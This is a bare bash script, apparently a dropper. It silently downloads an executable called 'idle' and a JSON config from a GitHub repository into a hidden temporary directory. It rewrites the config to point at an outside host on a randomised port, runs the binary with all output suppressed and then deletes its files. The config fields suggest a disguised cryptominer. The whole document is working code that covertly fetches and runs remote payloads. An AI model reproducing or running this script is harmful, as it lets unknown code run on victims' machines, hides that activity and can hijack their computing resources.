#!/bin/bash

port="1130"
host="dyn.dream.avspic.com"
url="https://github.com/pakoinake/jzoax/raw/refs/heads/main"
work=`mktemp -d -t .XXXXXXXXX`

portAdd="$((RANDOM % 10))"
port="$((port + portAdd))"
name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`

[ -d "${work}" ] || exit 1
trap "rm -rf ${work}" EXIT
cd "${work}"
curl -sSLo "idle" "${url}/idle" 2>/dev/null
curl -sSLo "config.json" "${url}/idle.json" 2>/dev/null
[ -f "config.json" ] && [ -n "$host" ] && [ -n "$port" ] && sed -i "s/\"url\":.*,/\"url\": \"${host}:${port}\",/g" "config.json"
[ -f "config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "config.json"
chmod -R a+x ./
timeout --foreground 60 ./idle >/dev/null 2>&1
exit 0
